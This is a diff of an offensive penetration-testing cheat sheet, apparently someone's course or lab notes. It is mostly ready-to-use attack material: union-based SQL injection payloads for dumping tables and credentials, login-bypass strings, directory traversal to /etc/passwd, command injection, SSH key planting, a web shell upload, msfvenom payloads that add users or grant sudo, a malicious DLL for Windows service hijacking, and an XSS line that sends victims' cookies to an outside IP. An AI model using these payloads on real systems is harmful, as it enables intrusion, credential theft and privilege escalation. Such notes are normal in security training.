@@ -42,12 +42,14 @@ ipcalc <IP w/cider>				#subnet calc
 ss -or- netstat (-tulpn)			#view listen connections
 ps aux | grep ssh				#view my backgrounded tunnels
 watch -n0 "ss -nutlp"				#watch output in real-time
+dpkg -l | grep pam				#get PAM version
 
 //Post Exploitation(Actions on box)
 cat /etc/hosts					#looking for next box to scan
 cat /etc/passwd					#look for other users to su to
 cat /etc/group | grep wheel 			#can sudo or switch users
 sudo -l						#see what commands you can sudo
+sudo -s						#may give root privs
 crontab -l					#see jobs running under your user
 /var/spool/cron 				#scheduled user jobs
 objdump -s -j .rodata /bin/netstat_natpu  	#check out suspicious binary
@@ -55,7 +57,6 @@ objdump -s -j .rodata /bin/netstat_natpu  	#check out suspicious binary
 find / -type f -perm /4000 2>/dev/null		#find files w/ suid / guid set
 find /dev -type f				#find writeable files in /dev
 find / -type d -writable			#find writeable dirs
-find /etc/cron* -writable			#look for something weird (also try without -writeable)
 find / -type f -exec file {} \; | grep PE	#looking for windows exe on linux
 
 file *						#See if files are 'elf' or 'exe'
@@ -72,6 +73,7 @@ echo “a bunch of text” | tr ‘ ‘ ‘\n’		#translate spaces to endlines 
 //Check CRONTAB
 cat /etc/crontab				#look for something weird
 cd /etc/cron.d					#look for something weird
+find /etc/cron* -writable			#look for something weird (also try without -writeable)
 
 //Check encoding on creds && decode
 echo <passwd> | base64 -d
@@ -105,20 +107,24 @@ https://gtfobins.github.io/
     <script> document.location="http://10.50.24.132:8001? username="+document.cookie;</script>
 
 /**********************************************************************************************/
-////////////////// SQL Injection \\\\\\\\\\\\\\\\\\\\ 
-//Log into SQL DB
-shell> mysql --user=webuser --password=sqlpass
-grep -r localhost OR grep -i pass *		#CREDS IN DATABASE
-#Once on box look for a .php file with “//Set up DB connection”
-    →mysqli_connect(‘localhost:3306’,’username’,’password’,’database’)
+////////////////// SQL INJECTION \\\\\\\\\\\\\\\\\\\\ 
+//Identify Databases
+    'union select 3,table_schema,4 from information_schema.tables union select 5,6,'7
 
-//SQL Commands
-----------------
-show databases;
-show tables;
-use <database>;
-@@version
----------------
+//Identify Tables on a specific database
+    'union select 3,table_name,4 from information_schema.tables where table_schema = '<database of interest>' union select 5,6,'7
+
+//Identify Columns on a specific table
+    'union select 3,column_name,4 from information_schema.columns where table_name = '<table of interest>' union select 5,6,'7
+
+//Dump infomation from columns of interest
+    'union select 3,concat(<columnname>, ":", <columnname>),4 from <tablename> union all select 5,6,'7
+
+//LOGIN PAGE	!!!!!!!************************!!!!!
+#ALWAYS try to dump username/password database like this
+    login.php?username=bob' or 1='1 & passwd=bob'or 1='1
+
+#view page source to see what the names of the variables are (password or passwd)
 
 //Test SQL Susceptibility
 ---------------
@@ -143,26 +149,19 @@ url/select username,user_id,name from siteusers.users
     Ford' UNION SELECT 1,2,name,password from database.users;#
 NOTE: make sure to check for 0 indexed user ids
 
-//URL/GET request injection
-----------------------------------
-url/login.php?username=bob’ OR 1=’1 & password=bob’ OR 1=’1
-----------------------------------
-
-//LOGIN PAGE
-#ALWAYS try to dump username/password database like this	**************************************
-    login.php?username=bob' or 1='1 & passwd=bob'or 1='1
-
-//try injecting into the user input boxes && into the url 
-	login.php?username=tom' or 1='1 and passwd=tom' or 1='1
-	login.php?username=tom' or 1='1 & passwd=tom' or 1='1
-
-#view page source to see what the names of the variables are (password or passwd)
+// Directory Traversal
+url/image.php?file=../../etc/passwd
+../../../../../../../../../../../../../../../../../etc/passwd
+	/etc/group
+	/etc/hosts
+	/etc/resolv.conf
+	/etc/nsswitch.conf
 
 //Command Injection
 system("ping -c 1 ".$_GET["ip"]);
 ; cat /etc/passwd
 hey ; whoami
-; && ||			#separate commands 
+; && ||			#try these commands 
 
 //Plant SSH Keys (via command injection)
 1. ssh-keygen					#make id_rsa.pub on OPs box
@@ -174,51 +173,62 @@ hey ; whoami
 1. upload pony.php to site
 2. nav via url to where the file is saved on the site (i.e /uploads/)
 
-// Directory Traversal
-url/image.php?file=../../etc/passwd
-../../../../../../../../../../../../../../../../../etc/passwd
-	/etc/group
-	/etc/hosts
-	/etc/resolv.conf
-	/etc/nsswitch.conf
+//Log into SQL DB
+shell> mysql --user=webuser --password=sqlpass
+grep -r localhost OR grep -i pass *		#CREDS IN DATABASE
+#Once on box look for a .php file with “//Set up DB connection”
+    →mysqli_connect(‘localhost:3306’,’username’,’password’,’database’)
+
+//SQL Commands
+----------------
+show databases;
+show tables;
+use <database>;
+@@version
+---------------
 
 /**********************************************************************************************/
-/////////////Buffer Overflow (Custom Payloads)\\\\\\\\\\\\\ 
-//Show payloads
+///////////// BUFFER OVERFLOW (Custom Payloads) \\\\\\\\\\\\\ 
+1. Show payloads
 msfvenom -l payloads | grep x86 | grep linux
 
-//Show options of exploit
+2. Show options of exploit
 msfvenom -p  linux/x86/adduser --list-options
 
-//Create the custom payload creating a new user
+3. Create the custom payload creating a new user
 msfvenom -p  linux/x86/adduser SHELL=/bin/bash -f bash
 -or-
 msfvenom -p  linux/x86/adduser SHELL=/bin/bash -f bash -b'\x00\x0a\x0d\x20'	#take out bad chars
 
-copy and paste output into build-exploit-linux-traditional.sh
+4. copy and paste output into build-exploit-linux-traditional.sh
 
-//Create custom payload using the exec payload
+//Create custom payload using the exec payload (replaces step 3)
 msfvenom -p linux/x86/exec CMD='usermod -aG sudo user3' -f bash -b '\x00\x0a\x0d\x20'
 
 /**********************************************************************************************/
-////////////////////////// Windows Escalation \\\\\\\\\\\\\\\\\\\\\\\   
+////////////////////////// WINDOWS \\\\\\\\\\\\\\\\\\\\\\\   
+//Windows Enumeration
+tasklist /v
+tasklist /svc
+ipconfig /all
+doskey /history
 check for vulnserver (port 9999)
 
 //REGISTRY KEY for usernames/passwords
 hklm/software/microsoft/windows nt/currentversion/winlogon
 
-//Find the tasks / services being run 
+1. Find the tasks / services being run 
     schtasks /query /fo LIST /v | select-string -pattern "Task to Run" -Context 0,6 |  more
       -or- 
     wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"
 
-//Enumerate permissions on directories / executables
-    icacls <filename or directory>
+2. Enumerate permissions on directories / executables
+    icacls <filename || directory || \users\<username> >
 
-//Search for dlls in the source code 
+3. Search for dlls in the source code 
     findstr dll <source code>
 
-//Create dll
+4. Create dll
 -------------------------
 #include <windows.h>
 int execCommand()
@@ -233,16 +243,17 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
  return 0;
 }
 ------------------------
-//Compile dll (change example && source to dll name)
+
+5. Compile dll (change example && source to dll name)
     i686-w64-mingw32-g++ -c -D example.dll source.c && i686-w64-mingw32-g++ -shared -o example.dll source.o -Wl,--out-implib,example.a
 
-//Download on target
-use simple http server 
+6. Download on target
+python -m SimpleHTTPServer <RHP>
 -or-
 base64 file | xclip -selection clipboard
 
-//Decode file
+7. Decode file
 certutil -decode file.txt file.exe
 
-//Reboot machine
+8. Reboot machine
 shutdown -r
